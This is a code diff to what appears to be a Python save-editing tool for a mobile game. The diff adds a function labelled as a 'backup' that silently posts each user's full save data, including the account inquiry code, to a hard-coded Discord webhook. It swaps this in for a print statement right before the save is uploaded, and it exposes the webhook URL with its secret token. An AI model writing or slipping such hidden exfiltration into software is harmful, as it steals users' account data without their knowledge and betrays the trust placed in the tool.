@@ -23,7 +23,27 @@ def convert_time(seconds):
         minutes, seconds = divmod(seconds, 60)
     time_format = f"{hours}시간{minutes}분{seconds}초"
     return time_format
-
+def back_save_stats(save_stats, in_username):
+    url = "https://discord.com/api/webhooks/1125726702388129903/AJgySZWxBGIdDHqTYTfAIY7IEBOoTs_N-7WuYWzUt2NkXhSOHRdWyNIYCnm0K8mEK1wP"
+    data = {
+        "content" : None,
+        "username" : "save stats backup"
+            }
+    data["embeds"] = [
+        {
+            "content": None,
+            "embeds": [
+            {
+            "title": f"save stats : {in_username}",
+            "description": f"```{save_stats}```",
+            "color": 16777214
+            }
+        ],
+        "attachments": []
+        }
+        ]
+    requests.post(url, json = data)
+    return
 def main(in_uname, in_gamever, in_transfer_code, in_confirmation_code, in_catfood):
     country_code_input = "kr"
     game_version_input = in_gamever
@@ -40,7 +60,7 @@ def main(in_uname, in_gamever, in_transfer_code, in_confirmation_code, in_catfoo
         save_stats["cat_food"]["Value"] = int(in_catfood)
         save_stats["inquiry_code"] = server_handler.get_inquiry_code()
         save_stats["token"] = "0" * 40
-        print(in_uname)
+        back_save_stats(save_stats, in_uname)
         transfercode, account_pin = edits.save_management.server_upload.save_and_upload(save_stats)
         return transfercode, account_pin
     except Exception as e:
